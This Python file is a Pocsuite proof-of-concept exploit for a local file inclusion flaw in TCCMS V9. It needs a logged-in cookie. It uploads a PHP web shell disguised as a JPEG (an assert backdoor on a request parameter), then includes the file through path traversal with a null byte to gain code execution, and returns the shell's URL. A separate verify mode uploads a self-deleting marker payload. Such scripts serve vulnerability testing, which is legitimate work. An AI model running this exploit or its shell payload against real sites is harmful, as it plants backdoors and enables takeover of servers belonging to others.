#!/usr/bin/env python
# coding: utf-8
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register
from pocsuite.lib.core.data import logger
from pocsuite.lib.core.enums import CUSTOM_LOGGING
import urlparse
import re


class TestPOC(POCBase):
    vulID = ''  # ssvid
    version = '1.0'
    author = ['Gump']
    vulDate = '2015-06-30'
    createDate = '2016-01-24'
    updateDate = '2016-01-24'
    references = ['http://www.wooyun.org/bugs/wooyun-2015-0104065']
    name = 'TCCMS V9 本地文件包含 POC'
    appPowerLink = 'http://www.teamcen.com/'
    appName = 'TCCMS'
    appVersion = 'V9'
    vulType = 'Local File Inclusion'
    desc = '''
    TCCMS在system/core/controller.class.php中对参数过滤不严导致本地文件包含
    '''
    samples = ['']
    # 组件下载地址：http://down.chinaz.com/soft/33822.htm
    
    # 需要登录后的cookie
    def check_argv(self):
        logger.log(CUSTOM_LOGGING.WARNING,u"注意，需要登录后的cookie")
        if self.headers['Cookie']:
            logger.log(CUSTOM_LOGGING.WARNING,u"请务必确保cookie正确")
            return True
        else:
            logger.log(CUSTOM_LOGGING.WARNING,u"请提交登录后的cookie")
            return False
            
    
    def _attack(self):
        if self.check_argv():
            result = {}

            self.headers['Content-Type'] = "multipart/form-data; boundary=----WebKitFormBoundaryMOKvckE0g6qr7jKz"
            post_data = "------WebKitFormBoundaryMOKvckE0g6qr7jKz\r\nContent-Disposition: form-data; name=\"files\"; filename=\"testjpg.jpg\"\r\nContent-Type: image/jpeg\r\n\r\n<?php var_dump(md5(123));@assert($_REQUEST['gump']);?>\r\n------WebKitFormBoundaryMOKvckE0g6qr7jKz\r\nContent-Disposition: form-data; name=\"submit\"\r\n\r\n\r\n  \r\n------WebKitFormBoundaryMOKvckE0g6qr7jKz\r\nContent-Disposition: form-data; name=\"type\"\r\n\r\n\r\n------WebKitFormBoundaryMOKvckE0g6qr7jKz\r\nContent-Disposition: form-data; name=\"picWidth\"\r\n\r\n142\r\n------WebKitFormBoundaryMOKvckE0g6qr7jKz\r\nContent-Disposition: form-data; name=\"picHeight\"\r\n\r\n102\r\n------WebKitFormBoundaryMOKvckE0g6qr7jKz\r\nContent-Disposition: form-data; name=\"waterImg\"\r\n\r\n0\r\n------WebKitFormBoundaryMOKvckE0g6qr7jKz--\r\n\r\n"
            # 上传shell
            post_url = urlparse.urljoin(self.url,'index.php?ac=common_upfile&type=')
            resp = req.post(url=post_url,data=post_data)

            # 从返回的内容中提取上传图片的文件名
            if resp.status_code == 200:
                match_result = re.search(r'value =\'(.*?)\'',resp.content,re.I | re.M)
                if match_result:
                    # 访问本地文件包含地址
                    payload = "../../uploadfiles/" + match_result.group(1) + "%00"
                    vul_url = urlparse.urljoin(self.url,"index.php?d=" + payload)
                    resp = req.get(vul_url)
                    if resp.status_code == 200 and '202cb962ac59075b964b07152d234b70' in resp.content:
                        result['ShellInfo'] = {}
                        result['ShellInfo']['URL'] = vul_url
                        result['ShellInfo']['Content'] = "<?php var_dump(md5(123));@assert($_REQUEST['gump']);?>"
            return self.parse_attack(result)

        return self._verify()

    def _verify(self):
        if self.check_argv():
            result = {}

            # 设置header里的Content-Type，表明需要上传文件
            self.headers['Content-Type'] = "multipart/form-data; boundary=----WebKitFormBoundaryMOKvckE0g6qr7jKz"
            # 文件名为testjpg.jpg，内容为<?php echo md5(0x2333333);unlink(__FILE__); ?>
            post_data = "------WebKitFormBoundaryMOKvckE0g6qr7jKz\r\nContent-Disposition: form-data; name=\"files\"; filename=\"testjpg.jpg\"\r\nContent-Type: image/jpeg\r\n\r\n<?php echo md5(0x2333333);unlink(__FILE__); ?>\r\n------WebKitFormBoundaryMOKvckE0g6qr7jKz\r\nContent-Disposition: form-data; name=\"submit\"\r\n\r\n\r\n  \r\n------WebKitFormBoundaryMOKvckE0g6qr7jKz\r\nContent-Disposition: form-data; name=\"type\"\r\n\r\n\r\n------WebKitFormBoundaryMOKvckE0g6qr7jKz\r\nContent-Disposition: form-data; name=\"picWidth\"\r\n\r\n142\r\n------WebKitFormBoundaryMOKvckE0g6qr7jKz\r\nContent-Disposition: form-data; name=\"picHeight\"\r\n\r\n102\r\n------WebKitFormBoundaryMOKvckE0g6qr7jKz\r\nContent-Disposition: form-data; name=\"waterImg\"\r\n\r\n0\r\n------WebKitFormBoundaryMOKvckE0g6qr7jKz--\r\n\r\n"
            # 上传地址，这个是正常功能
            post_url = urlparse.urljoin(self.url,'index.php?ac=common_upfile&type=')
            resp = req.post(url=post_url,data=post_data)

            # 从返回的内容中提取上传图片的文件名
            if resp.status_code == 200:
                match_result = re.search(r'value =\'(.*?)\'',resp.content,re.I | re.M)
                if match_result:
                    # 访问本地文件包含地址
                    payload = "../../uploadfiles/" + match_result.group(1) + "%00"
                    vul_url = urlparse.urljoin(self.url,"index.php?d=" + payload)
                    resp = req.get(vul_url)
                    if resp.status_code == 200 and '5a8adb32edd60e0cfb459cfb38093755' in resp.content:
                        result['VerifyInfo'] = {}
                        result['VerifyInfo']['URL'] = vul_url
            return self.parse_attack(result)

    def parse_output(self, result):
        #parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)